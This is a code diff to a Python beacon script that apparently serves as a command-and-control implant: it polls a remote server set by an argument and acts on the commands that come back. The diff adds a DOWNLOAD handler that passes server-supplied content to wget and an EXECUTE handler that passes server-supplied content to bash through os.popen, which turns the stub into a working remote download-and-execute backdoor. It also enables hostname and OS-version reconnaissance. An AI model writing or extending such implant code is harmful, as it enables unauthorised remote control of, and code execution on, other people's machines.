@@ -8,10 +8,12 @@ btoken = ""
 baseurl = "http://localhost:8080"
 
 def main(argv):
-	if len(argv) != 3:
-		print("Usage: $ python3 beacon.py <id> <beacon token>")
+	global baseurl
+
+	if len(argv) < 3 or len(argv) > 4:
+		print("Usage: $ python3 beacon.py <id> <beacon token> <baseurl>")
 	else:
-		baseurl = "http://localhost:8080"
+		baseurl = argv[3]
 		url = baseurl + "/beacon/command"
 
 		btoken = argv[2]
@@ -54,13 +56,13 @@ def main(argv):
 				print("quitting")
 				quit()
 			elif command_type == "GETHOSTNAME":
-				result["content"] = print(os.popen("hostname").read())
+				result["content"] = (os.popen("hostname").read())
 			elif command_type == "GETHOSTOSNAME":
-				result["content"] = print(os.popen("sw_vers -productVersion").read())
+				result["content"] = (os.popen("sw_vers -productVersion").read())
 			elif command_type == "DOWNLOAD":
-				result["content"] = "pending"
-			elif command_type == "UPLOAD":
-				result["content"] = "pending"
+				result["content"] = (os.popen("wget " + content).read())
+			elif command_type == "EXECUTE":
+				result["content"] = (os.popen("bash " + content).read())
 			
 			exec_time = datetime.now()
 			exec_time_str = recv_time.strftime("%Y-%m-%dT%H:%M:%S")
